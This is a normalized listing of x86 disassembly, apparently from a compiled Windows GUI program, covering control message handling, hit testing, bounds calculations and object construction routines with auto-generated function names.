mov ebx eax
mov edx ebx
mov eax ebx
call sub_43dcbc
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43e384
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43f780
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_40348c
sub_43f8c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43f1a0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43f134
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43f1a0
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43f960
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f780
pop esi
pop ebx
retn
sub_43f985
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f780
pop esi
pop ebx
retn
sub_43f9ab
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f780
pop esi
pop ebx
retn
sub_43f9d5
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f780
pop esi
pop ebx
retn
sub_43fa00
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43fa30
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43f200
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4552a4
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_40348c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4552a4
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_40348c
sub_43faa8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43fae0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4552a4
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_40348c
sub_43fb18
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43e384
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43fae0
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4069fc
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40348c
sub_43fb90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43fae0
pop esi
pop ebx
retn
sub_43fbb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43fae0
pop esi
pop ebx
retn
sub_43fbd0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4552a4
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40348c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_449324
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fc28
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43e374
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43e384
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43f334
pop esi
retn
sub_43fc68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43f368
sub_43fd16
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43e594
mov cl 0x1
sub_43fd58
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43e2ec
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43e2ec
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43fd88
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43fdac
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4069fc
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_40348c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43f334
mov [ ebx + 0xc ] eax
sub_43fe50
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43e240
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43e240
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43fee4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031d8
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43d8e0
mov edx [ esp ]
mov eax esi
call sub_43d8bc
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43db68
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43dbac
sub_43ff68
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412618
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43dc64
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412668
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43db0c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fff4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43fee4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_444968
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43ff68
pop ecx
jmp r-xdata
sub_440054
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_440142
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440149
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43e17c
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43e14c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43e14c
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4043ec
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_404034
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43e06c
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_440150
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_40348c
sub_44017c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44019c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4401bc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4401dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4401fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44021c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44023c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41987c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43d7a0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40348c
sub_440274
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440310
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414114
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44ab30
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44ac68
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43e14c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44a9c8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44ad88
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440317
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_440320
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44035c
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_440320
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44040c
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40341c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_440440
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_440460
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax edi
call sub_4404a0
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_4404cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_4404f8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4069fc
mov eax esp
call sub_412690
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43dc90
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_40348c
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_40348c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43dcbc
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412690
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412618
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43dc64
sub_440620
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_440660
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ce90
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_440694
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44078c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43d24c
push ebx
push sub_442124
call sub_41a4bc
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cd6c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41cf14
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4035b4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c074
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_404034
lea eax [ ebx + 0x188 ]
call sub_403fe0
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440793
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
sub_440793
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4407b8
push ebx
push esi
push edi
call sub_40361c
mov ebx edx
mov edi eax
mov eax edi
call sub_4196cc
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_40564c
mov eax [ edi + 0x178 ]
call sub_403290
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43bdf8
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_441458
mov eax edi
call sub_441698
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403290
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44165c
mov esi eax
mov edx esi
mov eax edi
call sub_4414c4
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_441698
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43d324
test bl bl
jle r-xdata
call sub_41a554
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403604
sub_440888
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44094c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413c14
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_444b28
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413a74
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_413b68
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413a74
test eax eax
je r-xdata
sub_44095c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
